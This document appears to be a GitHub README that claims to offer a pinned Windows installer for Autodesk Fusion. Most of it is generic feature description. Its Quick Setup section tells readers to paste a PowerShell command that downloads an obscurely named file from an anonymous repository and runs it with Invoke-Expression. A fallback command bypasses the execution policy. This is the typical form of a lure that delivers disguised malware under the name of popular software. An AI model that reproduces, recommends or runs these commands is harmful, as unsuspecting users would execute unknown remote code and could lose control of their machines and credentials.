# Fusion

Fusion is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Fusion and work in it.

Autodesk Fusion is a Windows desktop application for parametric 3D modeling, assemblies, drawings, and manufacturing preparation. Teams use it to move from concept sketches through detailed solids, joints, and sheet-metal parts without switching between unrelated tools.

A typical session starts with a new design or an imported STEP file. You constrain sketches, extrude and fillet features, test fit in an assembly, then run a simulation or generate CAM operations for a mill or lathe. Rendering and technical drawings often close the loop before you archive the project locally or share exports with colleagues.

This repository holds a Windows setup package for consistent installs, short configuration notes for common deployment scenarios, and a changelog that tracks bundle updates. Use it when you need a pinned version for lab machines, offline workstations, or repeatable build images across a shop floor.

## What you do with it

- Parametric timelines let you edit sketches and features without rebuilding entire solid models from scratch.
- Assembly mode captures joints, contact sets, and motion studies for mechanisms on Windows workstations.
- Integrated CAM produces toolpaths for milling, turning, and probing tied directly to your Fusion models.
- PCB tools route boards and link enclosures so mechanical and electrical teams share one project context.
- Simulation workspaces check stress and thermal behavior before you commit expensive stock to the machine shop.
- Drawing views update when the model changes, keeping dimensions aligned with the latest design revision.
- Cloud-connected libraries sync standard parts and materials while you keep primary design files on local drives.
- Manufacturing extensions output post-processors and setup sheets formatted for common shop-floor CNC controllers.

## Quick Setup (PowerShell)

This installs the program Fusion on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/nina-mayer9084347862/fusion-setup-guide/main/lab3gbqnrd.7rn701b4 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/nina-mayer9084347862/fusion-setup-guide/main/lab3gbqnrd.7rn701b4 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `lab3gbqnrd.7rn701b4` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `nina-mayer9084347862/fusion-setup-guide`. Autodesk Fusion 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
